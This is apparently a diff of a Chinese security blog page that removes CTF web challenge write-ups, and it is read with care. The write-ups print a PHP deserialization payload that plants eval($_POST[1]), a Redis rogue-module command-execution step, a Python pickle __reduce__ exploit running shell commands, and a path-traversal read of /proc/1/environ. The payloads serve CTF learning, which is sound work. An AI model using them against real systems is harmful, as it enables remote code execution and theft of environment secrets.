invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>关于call_user_func 回调函数的用法</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$classname</span> = <span class="string">&quot;myclass&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;sqy_hello&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$classname</span>.<span class="string">&#x27;::say_hello&#x27;</span>);</span><br><span class="line"><span class="variable">$myobject</span>=<span class="keyword">new</span> <span class="title function_ invoke__">myclass</span>();</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$myobject</span>,<span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$myobject</span>,<span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>payload post 传参</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p=nss2::ctf</span><br></pre></td></tr></table></figure>
-
-<h2 id="天翼杯-2021-esay-eval"><a href="#天翼杯-2021-esay-eval" class="headerlink" title="[天翼杯 2021]esay_eval"></a>[天翼杯 2021]esay_eval</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public $code = &quot;&quot;;</span><br><span class="line">    function __call($method,$args)&#123;</span><br><span class="line">        eval($this-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;code = &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;a-&gt;a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_REQUEST[&#x27;poc&#x27;]))&#123;</span><br><span class="line">    preg_match_all(&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;,$_REQUEST[&#x27;poc&#x27;],$ret);</span><br><span class="line">    if (isset($ret[1])) &#123;</span><br><span class="line">        foreach ($ret[1] as $i) &#123;</span><br><span class="line">            if(intval($i)!==1)&#123;</span><br><span class="line">                exit(&quot;you want to bypass wakeup ? no !&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unserialize($_REQUEST[&#x27;poc&#x27;]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?poc=O:1:%22b%22:2:&#123;s:1:%22a%22;O:1:%22a%22:1:&#123;s:4:%22code%22;s:16:%22eval($_POST[1]);%22;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="redis提权"><a href="#redis提权" class="headerlink" title="redis提权"></a>redis提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">蚁剑Redis插件地址： https:``//github.com/Medicean/AS_Redis</span><br></pre></td></tr></table></figure>
-
-
-
-<p>先在有权限的目录上传一个exp.so文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件地址：https://github.com/Dliv3/redis-rogue-server</span><br></pre></td></tr></table></figure>
-
-<p>redis 命令执行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MODULE LOAD /var/www/html/exp.so</span><br><span class="line">system.exec &quot;命令&quot;</span><br></pre></td></tr></table></figure>
-
-<h2 id="HZNUCTF-2023-preliminary-pickle"><a href="#HZNUCTF-2023-preliminary-pickle" class="headerlink" title="[HZNUCTF 2023 preliminary]pickle"></a>[HZNUCTF 2023 preliminary]pickle</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/calc&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFlag</span>():</span><br><span class="line">    payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">    pickle.loads(base64.b64decode(payload).replace(<span class="string">b&#x27;os&#x27;</span>, <span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ganbadie!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/readFile&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readFile</span>():</span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>).replace(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;????&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>Python Pickle反序列化。pickle或cPickle，作用和PHP的serialize与unserialize一样。pickle不仅可以读写字符串，也可以读写文件：只需要采用pickle.dump()和pickle.load()</p>
-<p>使用pickle.dumps()函数将一个Person对象序列化成二进制字节流的形式。使用pickle.loads()将一串二进制字节流反序列化为一个Person对象。</p>
-<p>并且pickle.loads会解决import 问题，对于未引入的module会自动尝试import。也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。</p>
-<p>Pickle中一个不安全的因素——反序列化未知的二进制字节流。原因是该字节流可能包含被精心构造的恶意代码，此时如果我们使用pickle.loads()方法unpickling，就会导致恶意代码的执行。</p>
-<p>__reduce__函数，该函数能够定义该类的二进制字节流被反序列化时进行的操作。返回值是一个(callable, ([para1,para2…])[,…])类型的元组。当字节流被反序列化时，Python就会执行callable(para1,para2…)函数。我们可以通过在类中重写__reduce__方法，从而在反序列化时执行任意命令。</p>
-<p>解题脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">rayi</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">     <span class="keyword">return</span> <span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;env | tee b&#x27;)&quot;</span>,)</span><br><span class="line"></span><br><span class="line">a = rayi()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure>
-
-<p>然后访问</p>
-<p>非预期</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eadFile?filename=../../../../../../../../../../../../proc/1/environ</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1569,7 +1583,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-count">66</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1618,12 +1632,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">92k</span>
+    <span title="站点总字数">97k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:35</span>
+    <span title="站点阅读时长">5:54</span>
 </div>
 
 <!--
